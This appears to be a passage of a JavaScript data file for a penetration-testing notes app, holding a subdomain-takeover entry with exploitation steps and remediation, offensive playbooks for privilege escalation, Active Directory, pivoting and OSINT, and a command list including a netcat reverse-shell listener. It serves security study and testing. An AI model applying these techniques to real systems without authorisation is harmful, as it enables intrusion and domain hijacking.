                    'GitHub Pages',
                    'Heroku / Netlify',
                    'Azure App Services',
                    'Shopify / Tumblr'
                ],
                databaseSpecific: {
                    'Cookie Stealing': 'Reading session cookies scoped to *.example.com.',
                    'Phishing': 'Hosting a fake login page on a legitimate sub-domain.',
                    'XSS': 'Bypassing CSP or same-origin policies.'
                }
            },
            impact: {
                confidentiality: 'Stealing cookies/session tokens of main domain users.',
                integrity: 'Serving malware or phishing pages from a trusted domain.',
                availability: 'None (typically relies on the service handling the requests).',
                businessImpact: 'Severe reputation damage, bypass of security controls (CSP).'
            },
            exploitation: {
                reconnaissance: [
                    'Enumerate all subdomains (Sublist3r, Amass).',
                    'Check for CNAME records pointing to cloudy services.',
                    'Check for 404/NoSuchBucket errors on those endpoints.'
                ],
                techniques: [
                    'Identify dangling CNAME.',
                    'Register the resource at the provider (e.g., create S3 bucket with that name).',
                    'Upload malicious content.'
                ],
                advanced: [
                    'Second-order takeover (taking over the domain that the CNAME points to).',
                    'Zone transfer vulnerabilities.'
                ]
            },
            remediation: {
                immediate: [
                    'Remove dangling DNS records immediately.',
                    'Claim the resource yourself as a placeholder.',
                    'Continuously monitor DNS records.'
                ],
                longTerm: [
                    'Automate DNS audits.',
                    'Use "Alias" records over CNAME where possible (AWS specific).',
                    'Implement infrastructure-as-code to destroy DNS with resources.'
                ],
                codeExample: `// Infrastructure as Code (Terraform)
// Ensure DNS record is deleted when resource is destroyed.`
            },
            testing: {
                manual: [
                    'Dig CNAME records.',
                    'Visit the URL, look for "There is nothing here" provider messages.',
                    'Try to register the resource.'
                ],
                automated: [
                    'Subjack',
                    'Nuclei (takeover-templates)',
                    'SubOver'
                ],
                payload: "subdomain.target.com"
            },
            vectors: ['Dangling DNS Records'],
            tools: ['Subjack', 'Nuclei'],
            payloads: [
                "CNAME pointing to unclaimed [[PROVIDER]] bucket: [[BUCKET]]",
                "CNAME pointing to deleted Azure App Service: [[APP]]",
                "CNAME pointing to GitHub Pages (404): [[USER]].github.io"
            ],
            builderConfig: [
                { id: 'PROVIDER', label: 'Cloud Provider', placeholder: 'AWS S3' },
                { id: 'BUCKET', label: 'Bucket Name', placeholder: 'target-bucket' },
                { id: 'APP', label: 'App Name', placeholder: 'target-app' },
                { id: 'USER', label: 'GitHub Username', placeholder: 'target-user' }
            ],
            reports: [
                { title: 'Uber: Subdomain Takeover', url: 'https://hackerone.com/reports/175324', bounty: '$5,000' },
                { title: 'Starbucks: Azure Takeover', url: 'https://hackerone.com/reports/256112', bounty: '$2,000' }
            ]
        }
    ],

    // --- PLAYBOOKS (Methodologies) ---
    playbooks: [
        {
            id: 'pb-1',
            title: 'Web App Penetration Testing',
            description: 'Standard methodology for assessing web application security (OWASP based).',
            steps: [
                { id: 's1', label: 'Passive Recon (Whois, DNS, OSINT)', checked: false },
                { id: 's2', label: 'Active Recon (Nmap, Directory Brute Force)', checked: false },
                { id: 's3', label: 'Vulnerability Scanning (Nikto, Nuclei)', checked: false },
                { id: 's4', label: 'Manual Testing (Auth Bypass, SQLi, XSS)', checked: false },
                { id: 's5', label: 'Post-Exploitation & Reporting', checked: false }
            ]
        },
        {
            id: 'pb-2',
            title: 'Linux Privilege Escalation',
            description: 'Checklist for escalating privileges on a compromised Linux host.',
            steps: [
                { id: 'l1', label: 'Check Kernel Version (DirtyCow, etc.)', checked: false },
                { id: 'l2', label: 'Check Sudo Permissions (sudo -l)', checked: false },
                { id: 'l3', label: 'Find SUID Binaries', checked: false },
                { id: 'l4', label: 'Check Cron Jobs & Writable Paths', checked: false },
                { id: 'l5', label: 'Search for Cleartext Passwords', checked: false }
            ]
        },
        {
            id: 'pb-3',
            title: 'Active Directory Enumeration',
            description: 'Initial steps when landing on a domain-joined machine.',
            steps: [
                { id: 'ad1', label: 'Identify Domain Controllers', checked: false },
                { id: 'ad2', label: 'Enumerate Users & Groups (BloodHound)', checked: false },
                { id: 'ad3', label: 'Check for SPNs (Kerberoasting)', checked: false },
                { id: 'ad4', label: 'Check for AS-REP Roasting', checked: false }
            ]
        },
        {
            id: 'pb-4',
            title: 'Windows Privilege Escalation',
            description: 'Methodology for elevating privileges on Windows systems.',
            steps: [
                { id: 'w1', label: 'Check System Info (systeminfo, whoami /priv)', checked: false },
                { id: 'w2', label: 'Unquoted Service Paths', checked: false },
                { id: 'w3', label: 'AlwaysInstallElevated Registry Key', checked: false },
                { id: 'w4', label: 'Saved Credentials (cmdkey /list, Unattend.xml)', checked: false },
                { id: 'w5', label: 'Kernel Exploits (Windows Exploit Suggester)', checked: false }
            ]
        },
        {
            id: 'pb-5',
            title: 'Network Pivoting & Tunneling',
            description: 'Techniques for moving laterally through a network.',
            steps: [
                { id: 'p1', label: 'Identify Dual-Homed Hosts (ipconfig/ifconfig)', checked: false },
                { id: 'p2', label: 'SSH Dynamic Port Forwarding (-D 1080)', checked: false },
                { id: 'p3', label: 'Chisel / Socat Tunneling', checked: false },
                { id: 'p4', label: 'Ligolo-ng Setup', checked: false },
                { id: 'p5', label: 'ProxyChains Configuration', checked: false }
            ]
        },
        {
            id: 'pb-6',
            title: 'OSINT Investigation',
            description: 'Open Source Intelligence gathering checklist.',
            steps: [
                { id: 'o1', label: 'Google Dorking (site:, ext:, inurl:)', checked: false },
                { id: 'o2', label: 'Social Media Enumeration (LinkedIn employees)', checked: false },
                { id: 'o3', label: 'GitHub/GitLab Secret leaks', checked: false },
                { id: 'o4', label: 'Shodan/Censys Infra Scan', checked: false },
                { id: 'o5', label: 'Breach Data Search (HaveIBeenPwned)', checked: false }
            ]
        },
        {
            id: 'pb-7',
            title: 'Mobile App Penetration Testing',
            description: 'Checklist for Android and iOS security assessments.',
            steps: [
                { id: 'm1', label: 'Static Analysis (MobSF, Decompilation)', checked: false },
                { id: 'm2', label: 'Dynamic Analysis (Frida, Objection)', checked: false },
                { id: 'm3', label: 'Check for Root/Jailbreak Detection', checked: false },
                { id: 'm4', label: 'Intercept Traffic (Burp + Cert Pinning Bypass)', checked: false },
                { id: 'm5', label: 'Insecure Data Storage (SharedPreferences, SQLite)', checked: false }
            ]
        },
        {
            id: 'pb-8',
            title: 'Cloud Security Assessment (AWS)',
            description: 'Steps for auditing AWS environments.',
            steps: [
                { id: 'c1', label: 'Enumerate IAM Permissions (enum-iam)', checked: false },
                { id: 'c2', label: 'Check S3 Bucket Policies (Public Access)', checked: false },
                { id: 'c3', label: 'Lambda Function Code Review', checked: false },
                { id: 'c4', label: 'EC2 Metadata Service (IMDSv1 vs v2)', checked: false },
                { id: 'c5', label: 'CloudTrail Log Auditing', checked: false }
            ]
        },
        {
            id: 'pb-9',
            title: 'Bug Bounty Recon Workflow',
            description: 'Step-by-step reconnaissance for bounty hunting.',
            steps: [
                { id: 'bb1', label: 'Subdomain Enumeration (Sublist3r, Amass)', checked: false },
                { id: 'bb2', label: 'Subdomain Takeover Checks (Subjack)', checked: false },
                { id: 'bb3', label: 'HTTP Probing & Screenshotting (httpx, EyeWitness)', checked: false },
                { id: 'bb4', label: 'Parameter Discovery (Arjun, ParamSpider)', checked: false },
                { id: 'bb5', label: 'Fuzzing for Hidden Endpoints (ffuf)', checked: false }
            ]
        },
        {
            id: 'pb-10',
            title: 'API Security Testing (OWASP API 10)',
            description: 'Checklist for auditing REST and GraphQL APIs.',
            steps: [
                { id: 'api1', label: 'BOLA/IDOR Checks (Resource IDs)', checked: false },
                { id: 'api2', label: 'Broken Authentication (JWT, API Keys)', checked: false },
                { id: 'api3', label: 'Excessive Data Exposure', checked: false },
                { id: 'api4', label: 'Mass Assignment (Auto-binding)', checked: false },
                { id: 'api5', label: 'Rate Limiting & Throttling Checks', checked: false }
            ]
        },
        {
            id: 'pb-11',
            title: 'Source Code Review (Whitebox)',
            description: 'Manual analysis of source code for vulnerabilities.',
            steps: [
                { id: 'src1', label: 'Grep for Secrets (API Keys, Passwords)', checked: false },
                { id: 'src2', label: 'Dangerous Functions (eval, system, exec)', checked: false },
                { id: 'src3', label: 'Input Validation Logic (Sanitization)', checked: false },
                { id: 'src4', label: 'Auth Middleware Review', checked: false },
                { id: 'src5', label: 'Dependency Check (Vulnerable Libraries)', checked: false }
            ]
        }
    ],

    commands: [
        { id: 'cmd-1', title: 'Nmap Fast Scan', cmd: 'nmap -T4 -F 10.10.10.10' },
        { id: 'cmd-2', title: 'Fuzzing Directory', cmd: 'gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt' },
        { id: 'cmd-3', title: 'Netcat Listener', cmd: 'nc -lvnp 4444' }
    ],

    notes: [],

    // Core Logic Placeholder for UI to bind to if needed
    loadState: function () {
        // Return Self for easy access
        return this;
    },

    // Stub for saving snippet (in memory for this session)
    saveSnippet: function (snippet) {
        this.snippets.push(snippet);
        console.log("Snippet saved:", snippet);
    },

    savePlaybookState: function (pbId, steps) {
        const pb = this.playbooks.find(p => p.id === pbId);
        if (pb) pb.steps = steps;
        console.log("Playbook updated:", pbId);
    }
};

// Global Access
export default SecondBrainData;

